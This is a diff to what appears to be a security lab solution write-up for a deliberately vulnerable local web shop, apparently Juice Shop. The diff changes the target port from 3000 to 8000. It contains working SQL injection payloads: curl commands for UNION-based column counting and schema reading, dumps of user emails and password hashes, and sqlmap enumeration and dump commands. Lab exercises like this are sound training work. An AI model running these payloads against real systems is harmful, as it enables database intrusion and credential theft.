@@ -4,7 +4,7 @@
 
 ### Solution:
 
-**URL:** `http://localhost:3000/#/login`
+**URL:** `http://localhost:8000/#/login`
 
 **Payload for Email Field:**
 ```
@@ -52,37 +52,37 @@ The `--` comments out the rest of the query, and `OR 1=1` makes the WHERE clause
 ## Task 2.2: Blind SQL Injection - Data Extraction
 
 ### Vulnerable Endpoint:
-**Search API:** `http://localhost:3000/rest/products/search?q=`
+**Search API:** `http://localhost:8000/rest/products/search?q=`
 
 ### Step-by-Step Exploitation:
 
 #### 1. Confirm Vulnerability:
 ```bash
 # Normal search
-curl "http://localhost:3000/rest/products/search?q=apple"
+curl "http://localhost:8000/rest/products/search?q=apple"
 
 # SQL injection test
-curl "http://localhost:3000/rest/products/search?q='))--"
+curl "http://localhost:8000/rest/products/search?q='))--"
 ```
 
 #### 2. Determine Number of Columns:
 ```bash
 # Keep adding columns until no error
-curl "http://localhost:3000/rest/products/search?q='))UNION+SELECT+1--"
-curl "http://localhost:3000/rest/products/search?q='))UNION+SELECT+1,2--"
+curl "http://localhost:8000/rest/products/search?q='))UNION+SELECT+1--"
+curl "http://localhost:8000/rest/products/search?q='))UNION+SELECT+1,2--"
 # ... continue until success (9 columns)
-curl "http://localhost:3000/rest/products/search?q='))UNION+SELECT+1,2,3,4,5,6,7,8,9--"
+curl "http://localhost:8000/rest/products/search?q='))UNION+SELECT+1,2,3,4,5,6,7,8,9--"
 ```
 
 #### 3. Extract Table Names:
 ```bash
-curl "http://localhost:3000/rest/products/search?q='))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--"
+curl "http://localhost:8000/rest/products/search?q='))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--"
 ```
 
 #### 4. Extract User Data:
 ```bash
 # Get all users
-curl "http://localhost:3000/rest/products/search?q='))UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--"
+curl "http://localhost:8000/rest/products/search?q='))UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--"
 ```
 
 ### Extracted Password Hashes:
@@ -102,7 +102,7 @@ curl "http://localhost:3000/rest/products/search?q='))UNION+SELECT+id,email,pass
 Create a file `request.txt`:
 ```
 GET /rest/products/search?q=test HTTP/1.1
-Host: localhost:3000
+Host: localhost:8000
 User-Agent: Mozilla/5.0
 Accept: */*
 ```
@@ -111,16 +111,16 @@ Accept: */*
 
 ```bash
 # Basic enumeration
-sqlmap -u "http://localhost:3000/rest/products/search?q=test" --level=3 --risk=3
+sqlmap -u "http://localhost:8000/rest/products/search?q=test" --level=3 --risk=3
 
 # Enumerate tables
-sqlmap -u "http://localhost:3000/rest/products/search?q=test" --tables
+sqlmap -u "http://localhost:8000/rest/products/search?q=test" --tables
 
 # Dump Users table
-sqlmap -u "http://localhost:3000/rest/products/search?q=test" -T Users --dump
+sqlmap -u "http://localhost:8000/rest/products/search?q=test" -T Users --dump
 
 # Get all databases
-sqlmap -u "http://localhost:3000/rest/products/search?q=test" --dbs
+sqlmap -u "http://localhost:8000/rest/products/search?q=test" --dbs
 ```
 
 ### SQLMap Output (Users Table):
